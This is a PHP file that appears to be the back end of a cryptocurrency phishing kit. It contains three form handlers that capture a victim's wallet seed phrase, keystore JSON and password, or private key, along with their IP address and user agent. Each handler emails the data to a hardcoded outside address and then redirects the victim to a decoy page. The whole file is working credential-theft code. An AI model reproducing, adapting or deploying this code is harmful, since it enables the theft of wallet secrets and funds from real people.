<?php
error_reporting(0);
include 'email.php';

if (isset($_POST['btn1'])) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = ""; // Initialize the $message variable
    $message .= "|----------| Phrase |--------------|\n";
    $message .= "Selected Wallet             : " . ${_POST['menu-255']} . "\n";
    $message .= "Phrase             : " . $_POST['textarea-158'] . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|------ Spartanwarriorz ------|\n";
    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
    $subject = "Login : $ip";
    mail($send, $subject, $message);
    header("Location: ./bar.html");
    exit;
} else if (isset($_POST['btn2'])) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = ""; // Initialize the $message variable
    $message .= "|----------| Keystore json |--------------|\n";
    $message .= "Selected Wallet             : " . ${_POST['menu-255']} . "\n";
    $message .= "Keystore json             : " . $_POST['keystorejsonrainbow'] . "\n";
    $message .= "Password             : " . $_POST['passwordrainbow'] . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|------ Spartanwarriorz ------|\n";
    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
    $subject = "Login : $ip";
    mail($send, $subject, $message);
    header("Location: ./bar.html");
    exit;
} else if (isset($_POST['btn3'])) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = ""; // Initialize the $message variable
    $message .= "|----------| Private key |--------------|\n";
    $message .= "Selected Wallet             : " . ${_POST['menu-255']} . "\n";
    $message .= "Private key             : " . $_POST['privatekey'] . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|------ Spartanwarriorz ------|\n";
    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
    $subject = "Login : $ip";
    mail($send, $subject, $message);
    header("Location: ./bar.html");
    exit;
}
?>